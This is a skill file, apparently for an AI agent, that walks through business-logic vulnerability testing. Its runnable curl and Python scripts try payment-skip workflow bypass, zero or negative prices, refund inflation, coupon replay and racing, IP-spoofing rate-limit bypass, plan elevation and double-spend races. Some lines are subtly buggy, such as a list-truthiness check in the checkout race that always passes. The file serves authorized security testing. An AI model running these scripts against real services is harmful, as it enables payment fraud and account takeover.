---
name: web-vuln-business-logic
description: Business logic vulnerability detection including workflow bypass and price manipulation
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects business logic vulnerabilities by mapping application workflows, identifying state transitions, and testing each for skip/replay/manipulation attacks. Covers six categories: workflow step bypass, negative quantity and price manipulation, coupon and discount abuse, rate limit bypass via racing, feature flag abuse, and time-of-check-time-of-use (TOCTOU) race conditions. Uses manual testing with curl and Burp Suite — no specialized vulnerability scanner applies to this class.

## When to use

- When testing any feature involving money, credits, discounts, or refunds
- When an application has a multi-step workflow (checkout, registration, password reset, subscription upgrade)
- When a request body contains a price, quantity, amount, or discount field
- When a coupon or promo code endpoint exists
- When a feature is gated behind a role, plan, or subscription level
- When testing actions that check a value and then act on it (balance checks, ownership checks, quota limits)

## Prerequisites

- A valid test account with access to the feature being tested (use a free or test account)
- A proxy tool (Burp Suite or Caido) to intercept and modify requests
- Two accounts for race condition testing (or two browser sessions)
- For coupon testing: at least one valid coupon code (use a legitimately obtained code)
- Authorization under a valid bug bounty or pentest scope

## Inputs

| Variable | Required | Description |
|----------|----------|-------------|
| `SECSKILL_TARGET` | Yes | Base URL of the target (e.g., `https://app.example.com`) |
| `SECSKILL_TOKEN` | Yes | Bearer token or session cookie for the test account |
| `SECSKILL_WORKFLOW_START` | Yes | First endpoint in the workflow (e.g., `/checkout/start`) |
| `SECSKILL_WORKFLOW_END` | Yes | Final endpoint in the workflow (e.g., `/checkout/confirm`) |
| `SECSKILL_COUPON_CODE` | Optional | A valid coupon code to test for replay/stacking abuse |
| `SECSKILL_ITEM_ID` | Optional | Product or item ID to use in cart/price manipulation tests |
| `SECSKILL_OUTPUT_DIR` | Optional | Directory to save results (default: `./output`) |

## Workflow

### Step 1: Environment setup and workflow mapping

```bash
export TARGET="${SECSKILL_TARGET}"
export TOKEN="${SECSKILL_TOKEN}"
export FLOW_START="${SECSKILL_WORKFLOW_START}"
export FLOW_END="${SECSKILL_WORKFLOW_END}"
export COUPON="${SECSKILL_COUPON_CODE:-}"
export ITEM_ID="${SECSKILL_ITEM_ID:-}"
export OUTDIR="${SECSKILL_OUTPUT_DIR:-./output}"
mkdir -p "$OUTDIR"

echo "[*] Target  : $TARGET"
echo "[*] Flow    : $FLOW_START -> $FLOW_END"

# Map the full workflow by walking through it normally in the proxy
# Goal: identify every state transition, every endpoint, every parameter
cat <<'EOF'
WORKFLOW MAPPING CHECKLIST (do this in Burp before running automated tests):
  [ ] Walk through the full happy path once, capturing all HTTP requests
  [ ] Note every endpoint in order (Step 1 URL, Step 2 URL, ... Final URL)
  [ ] Identify all state parameters (session tokens, cart tokens, payment tokens, order IDs)
  [ ] Find any hidden fields in POST bodies (price, discount_rate, is_free, skip_payment)
  [ ] Identify the "completion" endpoint (the one that delivers value: activates account, charges card, grants access)
  [ ] Note any client-side state that is sent back to the server (do not trust client-supplied values)
EOF

# Probe the application for business-critical endpoints
echo "[*] Probing for business-critical endpoints..."
for path in /checkout /cart /payment /subscribe /upgrade /coupon /promo \
            /refund /transfer /redeem /gift /credits /billing /plans; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "${TARGET}${path}")
  [ "$code" != "404" ] && echo "  [$code] $path"
done
```

### Step 2: Workflow step bypass

```bash
echo "=== Step 2: Workflow Step Bypass ==="
# Normal flow: Step 1 (select) -> Step 2 (payment) -> Step 3 (confirm/activate)
# Attack: skip Step 2 (payment) and jump directly to Step 3

echo "[*] Testing direct access to workflow completion endpoint..."
# Test the completion/final endpoint with a fresh session (no prior steps)
RESPONSE=$(curl -sk -X POST "$TARGET$FLOW_END" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"skip_payment": true, "status": "paid", "confirmed": true}' \
  -o "$OUTDIR/bypass_direct.json" -w "%{http_code}")
echo "Direct access to $FLOW_END: HTTP $RESPONSE"
[ "$RESPONSE" = "200" ] && echo "[!] POTENTIAL BYPASS — completion endpoint accessible without prior steps" && \
  cat "$OUTDIR/bypass_direct.json" | python3 -m json.tool 2>/dev/null | head -20

# Test GET-based workflow skip (some confirm endpoints accept GET)
RESPONSE_GET=$(curl -sk "$TARGET$FLOW_END" \
  -H "Authorization: Bearer $TOKEN" \
  -o "$OUTDIR/bypass_get.json" -w "%{http_code}")
echo "GET $FLOW_END: HTTP $RESPONSE_GET"

# Test hidden parameter injection in intermediate steps
echo "[*] Testing hidden field manipulation in workflow steps..."
curl -sk -X POST "$TARGET$FLOW_START" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "enterprise", "price": 0, "is_free": true, "discount": 100, "promo": "ADMIN50"}' \
  -o "$OUTDIR/hidden_params.json" -w "\nHTTP: %{http_code}\n" | tail -3
echo "[*] Check $OUTDIR/hidden_params.json for signs of accepted parameters"
```

### Step 3: Negative quantity and price manipulation

```bash
echo "=== Step 3: Negative Quantity and Price Manipulation ==="

# Test negative quantity in cart (can result in credits or negative charges)
echo "[*] Testing negative quantity..."
for qty in -1 -100 0 0.001 999999 -999999; do
  code=$(curl -sk -X POST "$TARGET/api/cart" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"item_id\": \"${ITEM_ID:-1}\", \"quantity\": ${qty}}" \
    -o "$OUTDIR/qty_${qty//[-.]/_}.json" -w "%{http_code}")
  echo "  quantity=$qty -> HTTP $code"
  [ "$code" = "200" ] && grep -E '"total"|"price"|"amount"|"balance"' \
    "$OUTDIR/qty_${qty//[-.]/_}.json" 2>/dev/null | head -3
done

# Test price manipulation — change the price field in the POST body
echo ""
echo "[*] Testing price field manipulation..."
for price in 0 -1 0.01 1 0.001 "0.00" "-100"; do
  code=$(curl -sk -X POST "$TARGET/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"item_id\": \"${ITEM_ID:-1}\", \"price\": ${price}, \"quantity\": 1}" \
    -o "$OUTDIR/price_${price//[-.]/_}.json" -w "%{http_code}")
  echo "  price=$price -> HTTP $code"
  [ "$code" = "200" ] && grep -E '"charged"|"total"|"order_id"|"success"' \
    "$OUTDIR/price_${price//[-.]/_}.json" 2>/dev/null | head -2
done

# Test refund amount manipulation (request more than purchased)
echo ""
echo "[*] Testing refund amount manipulation..."
for refund_amount in 9999 99999 -1 "original_amount + 1"; do
  [ "$refund_amount" = "original_amount + 1" ] && continue
  code=$(curl -sk -X POST "$TARGET/api/refund" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"order_id\": \"${ITEM_ID:-1}\", \"amount\": ${refund_amount}}" \
    -o "$OUTDIR/refund_${refund_amount}.json" -w "%{http_code}")
  echo "  refund amount=$refund_amount -> HTTP $code"
  [ "$code" = "200" ] && echo "  [!] POTENTIAL — refund accepted, check if amount > original"
done

# Test currency manipulation
echo ""
echo "[*] Testing currency manipulation..."
for currency in "USD" "EUR" "JPY" "BTC" "FAKE" "null"; do
  code=$(curl -sk -X POST "$TARGET/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"price\": 100, \"currency\": \"${currency}\"}" \
    -o /dev/null -w "%{http_code}")
  echo "  currency=$currency -> HTTP $code"
done
```

### Step 4: Coupon and discount abuse

```bash
echo "=== Step 4: Coupon and Discount Abuse ==="

if [ -n "$COUPON" ]; then
  # Test 1: Apply coupon multiple times in the same session
  echo "[*] Testing coupon replay (same session, multiple applications)..."
  for i in 1 2 3; do
    code=$(curl -sk -X POST "$TARGET/api/coupon/apply" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"coupon_code\": \"${COUPON}\"}" \
      -o "$OUTDIR/coupon_apply_${i}.json" -w "%{http_code}")
    echo "  Application #$i: HTTP $code"
    cat "$OUTDIR/coupon_apply_${i}.json" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print('  discount:', d.get('discount') or d.get('amount') or d.get('total'))
except: pass
" 2>/dev/null
  done

  # Test 2: Coupon stacking — apply two coupons simultaneously
  echo ""
  echo "[*] Testing coupon stacking..."
  curl -sk -X POST "$TARGET/api/coupon/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon_codes\": [\"${COUPON}\", \"${COUPON}\", \"SAVE10\", \"DISCOUNT20\"]}" \
    -w "\nHTTP: %{http_code}\n" | tail -3

  # Test 3: Race condition on coupon redemption (same coupon, two concurrent requests)
  echo ""
  echo "[*] Testing coupon race condition (10 concurrent requests)..."
  for i in $(seq 1 10); do
    curl -sk -X POST "$TARGET/api/coupon/apply" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"coupon_code\": \"${COUPON}\"}" \
      -o "$OUTDIR/coupon_race_${i}.json" -w "[$i: %{http_code}] " &
  done
  wait
  echo ""
  echo "  Check if more than one request returned 200 with discount applied"
  grep -l '"success":true\|"applied":true\|"discount"' "$OUTDIR"/coupon_race_*.json 2>/dev/null | wc -l
  echo " coupon applications succeeded out of 10 concurrent attempts"
fi

# Test 4: Expired coupon — manipulate date or use a known expired format
echo ""
echo "[*] Testing coupon code patterns (expired/admin codes)..."
for test_code in "EXPIRED2023" "ADMIN50" "DEBUG100" "TEST" "FREE" "INTERNAL" "STAFF"; do
  code=$(curl -sk -X POST "$TARGET/api/coupon/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon_code\": \"${test_code}\"}" \
    -o /dev/null -w "%{http_code}")
  [ "$code" = "200" ] && echo "  [!] Coupon accepted: $test_code -> HTTP $code" || \
    echo "  $test_code -> HTTP $code"
done
```

### Step 5: Rate limit bypass

```bash
echo "=== Step 5: Rate Limit Bypass ==="

# Test 1: Parallel requests bypass (race before counter increments)
echo "[*] Testing rate limit bypass via parallel requests..."
RATE_LIMIT_ENDPOINT="${TARGET}/api/send-sms"

echo "[*] Sending 20 concurrent requests to $RATE_LIMIT_ENDPOINT"
SUCCESS_COUNT=0
for i in $(seq 1 20); do
  code=$(curl -sk -X POST "$RATE_LIMIT_ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"phone": "+1-555-0100"}' \
    -w "%{http_code}" -o /dev/null) &
  pids+=($!)
done
wait
echo "[*] All concurrent requests sent — check logs for how many succeeded"

# Test 2: Header-based rate limit bypass
echo ""
echo "[*] Testing rate limit bypass via IP spoofing headers..."
for header_set in \
  "-H 'X-Forwarded-For: 1.2.3.4'" \
  "-H 'X-Real-IP: 5.6.7.8'" \
  "-H 'X-Originating-IP: 9.10.11.12'" \
  "-H 'CF-Connecting-IP: 13.14.15.16'"; do
  code=$(eval curl -sk -X POST "$TARGET/api/login" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "$header_set" \
    -d '{"username":"test","password":"wrong"}' \
    -w "%{http_code}" -o /dev/null)
  echo "  $header_set -> HTTP $code"
done

# Test 3: HTTP/2 multiplexing — last-byte synchronization
echo ""
echo "[*] For Burp Suite: use Turbo Intruder with last-byte sync for precise race testing"
cat <<'EOF'
  # Turbo Intruder script (run in Burp Suite):
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             requestsPerConnection=20,
                             pipeline=True)
      for i in range(20):
          engine.queue(target.req, gate='race1')
      engine.openGate('race1')

  def handleResponse(req, interesting):
      table.add(req)
EOF
```

### Step 6: Feature flag and plan abuse

```bash
echo "=== Step 6: Feature Flag and Plan Abuse ==="

# Test upgrading plan via client-supplied field
echo "[*] Testing plan elevation via request manipulation..."
for plan_name in enterprise premium admin pro unlimited gold; do
  code=$(curl -sk -X POST "$TARGET/api/user/plan" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"plan\": \"${plan_name}\", \"trial\": true, \"bypass_payment\": true}" \
    -o "$OUTDIR/plan_${plan_name}.json" -w "%{http_code}")
  echo "  plan=$plan_name -> HTTP $code"
  [ "$code" = "200" ] && grep -E '"plan"|"tier"|"features"' \
    "$OUTDIR/plan_${plan_name}.json" 2>/dev/null | head -3
done

# Test feature flag manipulation in request body
echo ""
echo "[*] Testing feature flag abuse in request body..."
curl -sk -X POST "$TARGET/api/feature" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"feature": "admin_panel", "enabled": true, "override": true, "debug": true}' \
  -w "\nHTTP: %{http_code}\n" | tail -3

# Test accessing premium features directly with a free account
echo ""
echo "[*] Testing direct access to premium feature endpoints..."
for feature_path in /api/export /api/bulk /api/advanced /api/admin \
                    /api/premium /api/reports/all /api/analytics; do
  code=$(curl -sk -o "$OUTDIR/feature$(echo $feature_path | tr / _).json" \
    -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "${TARGET}${feature_path}")
  [ "$code" != "404" ] && echo "  [$code] $feature_path"
  [ "$code" = "200" ] && echo "  [!] POTENTIAL — premium feature accessible on free account"
done
```

### Step 7: TOCTOU race condition testing

```bash
echo "=== Step 7: Time-of-Check-Time-of-Use (TOCTOU) ==="

# Classic double-spend: check balance -> two concurrent spend requests
echo "[*] Testing TOCTOU double-spend on credit/balance consumption..."

# Python-based concurrent race test (more precise than bash &)
python3 - <<'PYEOF'
import threading
import requests
import os

target = os.environ.get("SECSKILL_TARGET", "")
token = os.environ.get("SECSKILL_TOKEN", "")
outdir = os.environ.get("SECSKILL_OUTPUT_DIR", "./output")

url = f"{target}/api/credits/spend"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = {"amount": 10, "action": "purchase"}

results = []
lock = threading.Lock()

def spend():
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        with lock:
            results.append((r.status_code, r.text[:100]))
    except Exception as e:
        with lock:
            results.append((-1, str(e)))

# Launch 10 threads simultaneously
threads = [threading.Thread(target=spend) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [(s, b) for s, b in results if s == 200]
print(f"Results: {len(successes)}/10 requests succeeded (HTTP 200)")
if len(successes) > 1:
    print(f"[!] POTENTIAL TOCTOU — {len(successes)} concurrent spend requests all succeeded")
    for i, (status, body) in enumerate(successes):
        print(f"  Thread {i+1}: {status} | {body[:80]}")
else:
    print("[-] No double-spend detected (check if balance was decremented correctly)")

with open(f"{outdir}/toctou_results.txt", "w") as f:
    for status, body in results:
        f.write(f"{status}|{body}\n")
PYEOF

# Test checkout racing (buy once, get twice)
echo ""
echo "[*] Testing checkout race condition (duplicate order)..."
python3 - <<'PYEOF'
import threading, requests, os

target = os.environ.get("SECSKILL_TARGET", "")
token = os.environ.get("SECSKILL_TOKEN", "")
url = f"{target}/api/checkout/confirm"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = {"cart_id": os.environ.get("SECSKILL_ITEM_ID", "test-cart"), "payment_method": "card"}

results = []
lock = threading.Lock()

def confirm():
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        with lock:
            results.append((r.status_code, r.text[:100]))
    except Exception as e:
        with lock:
            results.append((-1, str(e)))

threads = [threading.Thread(target=confirm) for _ in range(5)]
barrier = threading.Barrier(5)

def barrier_confirm():
    barrier.wait()  # all threads start at exactly the same moment
    confirm()

threads = [threading.Thread(target=barrier_confirm) for _ in range(5)]
for t in threads:
    t.start()
for t in threads:
    t.join()

orders = [(s, b) for s, b in results if s == 200]
print(f"Checkout race: {len(orders)}/5 confirmations accepted")
[ len(orders) > 1 ] and print(f"[!] POTENTIAL RACE — {len(orders)} orders created from one cart")
PYEOF
```

### Step 8: Business impact documentation

```bash
echo "=== Step 8: Business Impact Assessment ==="

cat <<'EOF'
BUSINESS LOGIC IMPACT CLASSIFICATION:

  Price manipulation -> 0$ purchase    : Critical (direct revenue loss)
  Negative quantity  -> free credit    : Critical (financial fraud)
  Coupon replay      -> infinite disc. : High (financial abuse at scale)
  TOCTOU double-spend                  : Critical (integrity + financial loss)
  Workflow bypass -> skip payment      : Critical (service without payment)
  Feature flag abuse -> premium free   : High (service integrity)
  Rate limit bypass -> OTP brute force : High (leads to ATO)
  Expired coupon still works           : Medium (limited financial impact)

REPORT FORMAT FOR BUSINESS LOGIC BUGS:
  Title: [Category] in [Endpoint] allows [actor] to [concrete impact]
  Example: "Negative quantity in /api/cart allows authenticated user to obtain store credits for free"

  Impact statement must quantify:
  - Monetary loss per exploit (e.g., "attacker obtains $X of credit for free")
  - Scale (e.g., "repeatable indefinitely with a single account")
  - Prerequisites (e.g., "requires only a free account, no other preconditions")
EOF

# Summarize findings
echo ""
echo "[*] Scan complete. Results saved in $OUTDIR/"
ls -lh "$OUTDIR/"*.json 2>/dev/null | head -20
```

## Done when

- At least one business logic vulnerability is confirmed with a reproducible request sequence
- The vulnerability type is classified (workflow bypass, price manipulation, coupon abuse, TOCTOU, etc.)
- Business impact is quantified with a concrete dollar amount or service abuse scenario
- Prerequisites are minimized (preferably: free account, no user interaction)
- A complete reproduction sequence (curl commands or Burp request sequence) is captured for the report

## Failure modes

| Symptom | Cause | Resolution |
|---------|-------|------------|
| Price field change returns 400 | Server validates price from catalog, not request | Try changing currency or discount_rate instead; look for hidden fields in multi-step flow |
| Coupon replay returns "already used" | Server marks coupon after first use | Test race condition: 10 concurrent apply requests before marking completes |
| Workflow bypass returns 403 | Server checks session state for prior steps | Try replaying a legitimate step's state token (from Burp history) with a different session |
| Negative quantity returns 400 | Input validation on quantity field | Try float (0.001), string ("−1"), or JSON null; check if validation applies only to UI |
| Race condition requests all return 200 but balance decrements correctly | Atomic DB transaction in place | Note as "well-implemented" but check other endpoints with less critical operations |
| Feature flag endpoint returns 404 | Feature flags managed server-side only | Try modifying response from the features/config endpoint (intercept + modify in Burp) |
| All refund amounts rejected | Refunds validated against original order | Test partial refund above original: 101% of purchase amount |

## Notes

- Business logic bugs require no special tools — a proxy and two accounts are sufficient for most tests.
- The highest-value business logic bugs involve financial impact: price manipulation, double-spend, and free premium access.
- TOCTOU bugs are best demonstrated with a Python threading script that starts all requests at a barrier — bash background jobs are too imprecise for sub-100ms race windows.
- Coupon race conditions often have a 5–50ms window. Use Burp Turbo Intruder with last-byte synchronization for the most reliable exploit.
- Document the "happy path" first before testing violations — you need to know what normal looks like to identify what is abnormal.
- Always quantify financial impact in the report: "attacker can obtain $X service for free" is more impactful than "price field is not validated."
- Workflow bypass bugs are often rated Critical because they directly undermine the payment mechanism that the business depends on for revenue.
